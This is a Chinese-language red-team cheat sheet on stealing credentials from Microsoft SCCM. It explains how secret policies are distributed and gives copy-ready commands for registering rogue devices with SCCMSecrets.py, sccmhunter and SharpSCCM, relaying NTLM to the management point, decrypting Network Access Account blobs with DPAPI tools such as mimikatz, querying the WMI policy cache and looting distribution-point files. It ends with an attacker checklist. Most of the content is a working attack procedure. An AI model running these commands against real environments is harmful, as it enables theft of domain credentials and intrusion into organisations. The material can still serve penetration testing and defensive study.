# SCCM 凭证获取详解

## 秘密策略架构

### 设备注册与策略分发

SCCM 通过"秘密策略" (Secret Policy) 向已批准的客户端分发敏感信息，包括:
- **Network Access Account (NAA)** — 域凭证，用于非域加入设备访问 DP
- **任务序列密码** — OS 部署中的嵌入凭证
- **Collection Variables** — 可能包含明文密码

### 两个注册端点

| 端点 | 路径 | 认证方式 |
|------|------|----------|
| **Windows Auth** | `/ccm_system_windowsauth/request` | NTLM/Kerberos |
| **Certificate Auth** | `/ccm_system/request` | 客户端证书 |

### 自动审批风险

若站点配置"自动审批所有计算机" (默认 workgroup 场景)，任何持有机器账号凭据的攻击者均可注册新设备并获取秘密策略。

**原理**: 注册设备后，SCCM 向其分发包含 NAA 凭证的策略。NAA 使用 DPAPI 加密存储，但策略传输时的加密密钥由注册流程协商，攻击者持有私钥即可解密。

---

## NAA 提取 — 注册新设备

### 方法 1: SCCMSecrets.py (推荐)

```bash
# HTTP Management Point
python3 SCCMSecrets.py policies -mp "http://$MP_IP" \
  -u "$MACHINE_NAME" -p "$MACHINE_PASSWORD" -cn "newdevice"
```

```bash
# HTTPS Management Point (PKI 环境)
python3 SCCMSecrets.py policies -mp "https://$MP_IP" \
  -u '$MACHINE_NAME' -p '$MACHINE_PASSWORD' -cn 'newdevice' \
  --pki-cert ./cert.pem --pki-key ./key.pem
```

SCCMSecrets 会自动:
1. 使用提供的机器账号向 MP 注册新设备
2. 请求并下载秘密策略
3. 解密 NAA 凭证并输出明文

### 方法 2: sccmhunter http

```bash
# 自动化注册 + 策略提取
sccmhunter.py http -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $DC_IP -auto

# 指定 MP
sccmhunter.py http -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $DC_IP \
  -mp "http://$MP_IP" -auto
```

### 方法 3: SharpSCCM (Windows)

```powershell
# 注册新设备并提取秘密
SharpSCCM.exe get secrets -r newdevice -u $MACHINE_NAME -p $PASSWORD
```

---

## NAA 提取 — NTLM Relay

无需域凭证，通过 relay 已有设备的 NTLM 认证到 MP。

```bash
# 启动 relay 到 MP 的 Windows Auth 端点
ntlmrelayx.py -t 'http://$MP_IP/ccm_system_windowsauth/request' \
  -smb2support --sccm-policies
```

触发认证后 (如通过 Responder / mitm6)，relay 到 MP 获取策略。

**原理**: relay 使用被害者的 NTLM 认证，如果被害者是已批准的 SCCM 客户端，MP 会返回包含 NAA 的秘密策略。

---

## 复用已有设备凭据

如果已攻陷一台 SCCM 客户端，可以提取其注册凭据后直接请求策略。

```bash
# 提取已有设备的注册信息 (需先从目标获取 compromised_device/ 目录)
python3 SCCMSecrets.py policies -mp "http://$MP_IP" \
  --use-existing-device compromised_device/
```

设备注册信息通常存储在:
- `C:\Windows\SMSCFG.ini` — SCCM GUID
- `HKLM\SOFTWARE\Microsoft\SystemCertificates\SMS\Certificates` — 注册证书

---

## 本地 DPAPI 提取

已在目标 SCCM 客户端上获得 SYSTEM 权限时，从本地 DPAPI 存储提取 NAA。

### SystemDPAPIdump (远程)

```bash
SystemDPAPIdump.py -creds -sccm $DOMAIN/$USER:$PASSWORD@$TARGET
```

### SharpSCCM 本地提取

```powershell
# 从磁盘上的 DPAPI blob 提取
SharpSCCM.exe local secrets disk

# 从 WMI 提取
SharpSCCM.exe local secrets wmi
```

### SharpDPAPI

```powershell
SharpDPAPI.exe SCCM
```

### mimikatz

```
# SCCM DPAPI 解密
dpapi::sccm
```

**原理**: SCCM 客户端将 NAA 凭证以 DPAPI 加密的形式存储在本地。以 SYSTEM 身份可以使用机器 DPAPI 主密钥解密获取明文凭证。

---

## WMI 直接查询

在 SCCM 客户端上通过 WMI 查询策略缓存 (需 SYSTEM 权限)。

```powershell
# Network Access Account (加密 blob)
Get-WmiObject -Namespace ROOT\ccm\policy\Machine\ActualConfig `
  -Class CCM_NetworkAccessAccount

# 任务序列
Get-WmiObject -Namespace ROOT\ccm\policy\Machine\ActualConfig `
  -Class CCM_TaskSequence

# 集合变量 (可能包含明文密码)
Get-WmiObject -Namespace ROOT\ccm\policy\Machine\ActualConfig `
  -Class CCM_CollectionVariable
```

WMI 返回的 NAA 为加密 blob，需配合 DPAPI 解密。`CCM_CollectionVariable` 可能直接包含明文凭证。

---

## Distribution Point 文件搜刮

DP 上存储所有部署的软件包、脚本、配置文件，可能包含凭证。

### SCCMSecrets.py files

```bash
# 按扩展名搜刮敏感文件
python3 SCCMSecrets.py files -dp "http://$DP_IP" \
  -u '$USER' -H '$HASH' \
  --extensions '.txt,.xml,.ps1,.pfx,.ini,.conf,.config,.bat,.cmd'
```

### cmloot.py

```bash
# 发现 SCCM 服务器并批量搜刮
python3 cmloot.py $DOMAIN/$USER@$TARGET \
  -findsccmservers \
  -target-file sccmhosts.txt \
  -cmlootdownload sccmfiles.txt
```

### sccm-http-looter

```bash
# HTTP 匿名访问 DP 内容
python3 sccm-http-looter.py -d "http://$DP_IP" -o ./loot/
```

### CMLoot PowerShell

```powershell
# PowerShell 版本 DP 搜刮
Invoke-CMLootInventory -SCCMHost $DP_IP -Outfile packages.txt
Invoke-CMLootDownload -InventoryFile packages.txt -OutFolder ./loot/
```

### 高价值文件类型

| 扩展名 | 可能内容 |
|--------|----------|
| `.ps1`, `.bat`, `.cmd` | 部署脚本 (可能含硬编码密码) |
| `.xml`, `.config` | 配置文件 (连接字符串、凭证) |
| `.pfx`, `.cer` | 证书和私钥 |
| `.ini` | 旧式配置 (明文密码) |
| `.mof` | WMI 配置 |
| `.vbs` | VBScript 部署脚本 |

---

## 凭证获取检查清单

```
[ ] 确认 MP 为 HTTP 还是 HTTPS
[ ] 尝试 SCCMSecrets.py 注册新设备提取 NAA
[ ] 尝试 sccmhunter http -auto
[ ] 如有已攻陷客户端 — DPAPI 本地提取
[ ] 如无凭证 — NTLM relay 到 MP
[ ] WMI 查询: CCM_NetworkAccessAccount, CCM_TaskSequence, CCM_CollectionVariable
[ ] DP 文件搜刮: SCCMSecrets files / cmloot
[ ] PXE 启动介质密码提取
[ ] NAA 为空时检查 eNAA 环境 / Collection Variables
```
